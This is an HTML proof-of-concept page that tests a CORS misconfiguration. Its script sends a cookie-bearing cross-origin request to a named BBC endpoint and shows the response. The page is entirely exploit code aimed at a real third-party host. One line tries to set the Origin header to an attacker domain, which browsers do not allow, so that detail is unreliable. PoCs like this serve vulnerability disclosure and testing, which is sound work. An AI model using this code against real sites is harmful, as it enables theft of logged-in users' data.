<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit PoC</title>
</head>
<body>
    <h1>CORS Misconfiguration Exploit</h1>
    <p>This PoC exploits the CORS misconfiguration by sending a request to the vulnerable endpoint and displaying the response.</p>
    <button id="exploitBtn">Exploit</button>
    <pre id="response">Click the button to exploit the vulnerability.</pre>

    <script>
        document.getElementById('exploitBtn').addEventListener('click', () => {
            fetch('https://heartbeat.activity.api.bbc.com', {
                method: 'GET',
                headers: {
                    'Origin': 'https://attacker-controlled.com'
                },
                credentials: 'include' // Ensures cookies or other credentials are sent
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }
                return response.text();
            })
            .then(data => {
                document.getElementById('response').textContent = data;
            })
            .catch(err => {
                document.getElementById('response').textContent = 'Error: ' + err.message;
            });
        });
    </script>
</body>
</html>
